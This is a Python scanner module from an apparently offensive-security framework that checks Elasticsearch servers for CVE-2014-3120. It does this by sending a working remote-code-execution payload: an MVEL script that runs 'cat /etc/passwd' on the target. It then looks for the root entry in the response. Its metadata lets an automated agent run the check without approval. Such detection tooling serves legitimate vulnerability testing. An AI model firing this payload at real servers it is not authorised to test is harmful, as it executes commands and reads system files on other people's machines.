#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The default configuration in Elasticsearch before 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ElasticSearch v1.1.1/1.2 RCE Detection',
        'description': "The default configuration in Elasticsearch before 1.2 enables dynamic scripting, which allows remote attackers to execute arbitrary MVEL expressions and Java code via the source parameter to _search. Be aware this only violates the vendor's intended security policy if the user does not run Elasticsearch in its own independent virtual machine.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2014', 'cve', 'rce', 'elasticsearch', 'kev', 'vulhub', 'elastic', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120',
            'https://www.elastic.co/blog/logstash-1-4-3-released',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-3120',
            'http://bouk.co/blog/elasticsearch-rce/',
            'https://www.elastic.co/community/security/',
        ],
        'cve': 'CVE-2014-3120',
    }

    def run(self):
        path = '/_search?pretty'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': '*/*', 'Accept-Language': 'en', 'Content-Type': 'application/x-www-form-urlencoded'}, data='{\n    "size": 1,\n    "query": {\n      "filtered": {\n        "query": {\n          "match_all": {\n          }\n        }\n      }\n    },\n    "script_fields": {\n        "command": {\n            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"cat /etc/passwd\\").getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"\n        }\n    }\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='medium', reason='ElasticSearch v1.1.1/1.2 RCE detected', path=path)
            return True
        return False

